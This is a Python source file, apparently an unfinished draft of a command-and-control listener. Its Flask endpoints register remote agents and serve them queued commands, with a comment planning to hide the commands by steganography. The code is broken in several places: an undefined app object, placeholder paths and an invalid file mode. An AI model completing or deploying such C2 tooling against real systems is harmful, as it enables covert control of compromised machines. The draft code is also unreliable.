import base64, os
import flask
import os
import sys


class Listener:
    def __init__(self, name, port, ip):
        self.name = name
        self.port = port
        self.ip = ip
        self.pathname = "data/listeners/{}/".format(self.name)#listener 

        if os.path.exists(self.pathname) == False:
            os.mkdir(self.pathname)
        
        if os.path.exists("{}key".format(self.pathname)) == False:
            key = 0 #create function for key
            self.key = key

            
            try:
                file = open("{}key".format(self.pathname),'wt')
                file.write(key)
            except:
                print("Error: Unable to write file")
            file.close()

        else:            
            try:
                file = open("{}key".format(self.pathname), 'rt')
                self.key = file.read()
            except:
                print("Error: Unable to read file")

        if os.path.exists("{}agents/".format(self.pathname)) == False:
            os.mkdir("{}agents/".format(self.pathname))

        if os.path.exists("{}files".format(self.pathname)) == False:
            os.mkdir("{}files".format(self.pathname))

        @self.app.route("/registeragent", methods=['POST'])
        def registerAgent():
            name = flask.request.form.get("name")
            remoteip = flask.request.remote_addr #gets ip automatically from request
            #hostname?
            #Type = flask.request.form.get("type")
            #print("Welcome registered Agent: {}".format(name))
            #add all agent data into a database
            message = "You have been registered {}!".format(name)
            return(message, 200)#??

        @self.app.route("/commands/<name>", methods=['GET'])
        def runCommands(name):
            if os.path.exists("self.agentsPath/name/tasks"):# FIX LATER
                try:
                    file = open("[][]/commands","read")#NOTE: change to match steganography
                    commands = file.read()
                except:
                    print("Unable to Read file")
            
            else:
                return()

